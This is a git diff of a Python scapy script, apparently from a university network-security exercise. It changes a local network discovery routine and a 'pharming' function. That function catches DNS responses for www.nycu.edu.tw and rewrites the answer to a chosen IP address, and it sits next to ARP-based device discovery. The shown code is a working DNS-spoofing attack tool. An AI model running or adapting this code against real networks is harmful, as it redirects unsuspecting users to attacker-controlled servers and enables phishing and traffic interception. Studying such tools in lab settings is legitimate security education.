@@ -54,21 +54,42 @@ def translate_to_slash(netmask):
     return 32 - slash
 
 
-def get_local_info():
-    # interfaces = netifaces.ifaddresses('wlp3s0')
-    interfaces = netifaces.ifaddresses('enp0s3')
-    # dictionary
-    normal_internet = interfaces[netifaces.AF_INET][0]
-    address = normal_internet['addr']
-    netmask = normal_internet['netmask']
-    broadcast = normal_internet['broadcast']
-    # slash = IPAddress(netmask).netmask_bits()
-    slash = translate_to_slash(netmask)
-    # obtain gateway
-    gws = netifaces.gateways()
-    gw = gws['default'][netifaces.AF_INET][0]
+# def get_local_info():
+#     interfaces = netifaces.ifaddresses('enp0s3')
+#     # dictionary
+#     normal_internet = interfaces[netifaces.AF_INET][0]
+#     address = normal_internet['addr']
+#     netmask = normal_internet['netmask']
+#     broadcast = normal_internet['broadcast']
+#     # slash = IPAddress(netmask).netmask_bits()
+#     slash = translate_to_slash(netmask)
+#     # obtain gateway
+#     gws = netifaces.gateways()
+#     gw = gws['default'][netifaces.AF_INET][0]
     
-    return address, netmask, broadcast, str(slash), gw
+#     return address, netmask, broadcast, str(slash), gw
+
+def get_local_info():
+    
+    interfaces = netifaces.interfaces()
+
+    for interface_name in interfaces:
+        interface = netifaces.ifaddresses(interface_name)
+        try:
+            # dictionary
+            normal_internet = interface[netifaces.AF_INET][0]
+            address = normal_internet['addr']
+            netmask = normal_internet['netmask']
+            broadcast = normal_internet['broadcast']
+            # slash = IPAddress(netmask).netmask_bits()
+            slash = translate_to_slash(netmask)
+            # obtain gateway
+            gws = netifaces.gateways()
+            gw = gws['default'][netifaces.AF_INET][0]
+            return address, netmask, broadcast, str(slash), gw
+        except KeyError:
+            print("this interface: ", interface_name, " isn't feasible")
+            continue
 
 def getDevice(ip, gw):
     request = scapy.ARP()
@@ -102,7 +123,8 @@ def pharming(pkt):
     # If the packet is really the DNS query response packet
     if data.haslayer(scapy.DNSRR):
         # If the query website is the target website
-        if "www.nycu.edu.tw." in str(data[scapy.DNSQR].qname):
+        # print(str(data[scapy.DNSQR].qname))
+        if "www.nycu.edu.tw" in str(data[scapy.DNSQR].qname):
             # Change the query IP to target server IP
             ans=scapy.DNSRR(rrname=data[scapy.DNSQR].qname, rdata="140.113.207.246")
             data[scapy.DNS].an=ans    # Save the modified IP into Scapy packet
